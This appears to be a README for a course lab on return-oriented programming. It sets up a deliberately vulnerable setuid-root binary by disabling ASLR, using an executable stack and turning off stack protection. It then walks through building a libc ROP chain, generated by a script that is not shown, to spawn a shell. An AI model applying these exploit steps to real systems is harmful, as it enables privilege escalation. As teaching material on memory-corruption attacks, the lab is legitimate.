# How to Launch a Shell in a Vulnerable Program
## Setup
- Disable ASLR:
```
sudo sysctl -w kernel.randomize_va_space=0
```
- For our example vulnerable program, we'll use `vuln.c` from assignment 1:
```
gcc -o vuln -z execstack -fno-stack-protector vuln.c
sudo chown root vuln
sudo chmod 4755 vuln
```
- In this attack, we'll assume that libc is not statically linked to the executable
- Link zsh to sh:
```
sudo ln -sf /bin/zsh /bin/sh
```

## Find Base Address of libc
- Run `ldd vuln` to find this base address:
```
	linux-gate.so.1 =>  (0xb7fd9000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e09000)
	/lib/ld-linux.so.2 (0xb7fdb000)
```
- In this example, libc's base address is `0xb7e09000`

## How to Create an ROP Shellcode
- We'll create an ROP chain to launch a shell
	- `vuln` will execute the generated `shellcode` during a buffer overflow
```
python3 gen_shellcode.py --libc_offset <libc_offset>
```
- For example:
```
python3 gen_shellcode.py --libc_offset 0xb7e09000
```
- If the `--gadgets` argument is included, we will create a shellcode with gadgets stored in that file
- **Note**: We don't recommend using `--gadgets`, because the generated shellcode won't work 100% of the time. Some gadgets found by ROPHunter may be invalid, because the actual execution could interpret the bytes differently than the Capstone disassembler.

## How to Launch a Shell
- We use GDB to determine where in the stack to store parts of the shellcode; e.g. `"/bin/sh\0"`
- However, GDB's stack frame may not match normal execution
- We use `invoke.sh` to run `vuln` within the same environment (courtesy of https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it):
- Run `vuln` in normal execution:
```
./invoke.sh vuln
```

### How to Debug this ROP Chain
#### Using GDB
- Run `vuln` with GDB:
```
./invoke.sh -d vuln
```
- We mst clear the two environment variables created by GDB:
```
unset env LINES
unset env COLUMNS
```

- We can then debug this ROP chain by setting breakpoints:
```
b main	# libc only gets loaded after main(), so we have to stop at main() before setting the other breakpoints
run
b *<Gadget address>	# e.g. First gadget's address is 0x2c79c
continue
```

#### Finding Correct %esp
- For some parts of the shellcode, we need to store addresses to other places on the stack
- We calculate these addresses by using the address stored in `%esp` at the first gadget
	- With return-oriented programming, `%esp` acts as the instruction pointer
- We can find this address by using GDB and can pass this address to `gen_shellcode.py` with the argument `init_esp_addr`

#### Determining Valid Gadgets
- If GDB stops at the expected instruction, then we have found the correct gadget
- Unfortunately, finding the right gadgets for an ROP shell is still trial-and-error. Some gadgets may be invalid, because GDB may not interpret the gadgets in the same way as the Capstone disassembler.
